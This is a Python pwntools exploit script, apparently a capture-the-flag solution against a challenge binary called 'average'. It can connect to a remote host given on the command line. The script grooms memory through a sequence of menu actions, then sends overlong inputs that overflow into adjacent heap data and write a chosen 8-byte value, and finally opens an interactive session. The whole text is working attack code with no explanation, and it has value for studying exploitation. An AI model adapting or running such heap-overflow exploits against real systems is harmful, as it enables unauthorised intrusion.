#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./average', checksec=False)
libc = elf.libc

def setup():
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process(["./ld-linux-x86-64.so", "--library-path", ".", "./average"], env={"LD_PRELOAD":"./libc.so.6"})
        context.terminal = ['tmux', 'splitw', '-h']
        if args.GDB:
            gdb.attach(p, gdbscript='''
            ''')
    
    return p

p = setup()

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', b'0')
p.sendlineafter(b'? ', b'0')
p.sendlineafter(b': ', b'hehe')
p.sendlineafter(b': ', b'hehe')

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', b'1')
p.sendlineafter(b'? ', b'0')
p.sendlineafter(b': ', b'hehe')
p.sendlineafter(b': ', b'hehe')

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', b'2')
p.sendlineafter(b'? ', b'0')
p.sendlineafter(b': ', b'hehe')
p.sendlineafter(b': ', b'hehe')

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', b'3')
p.sendlineafter(b'? ', b'0')
p.sendlineafter(b': ', b'A')
p.sendlineafter(b': ', b'A')

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', b'4')
p.sendlineafter(b'? ', b'0')
p.sendlineafter(b': ', b'A')
p.sendlineafter(b': ', b'A')

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'3')

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', b'3')
p.sendlineafter(b'? ', b'0')
p.sendlineafter(b': ', b'A' * 38)
p.sendlineafter(b': ', b'A' * 0x21 + b'\x70')

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'4')

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', b'4')
p.sendlineafter(b'? ', b'32')
p.sendlineafter(b': ', b'A' * (32 + 38))
p.sendlineafter(b': ', b'A' * 9 + p64(0xDEADBEEFCAFEBABE))

p.interactive()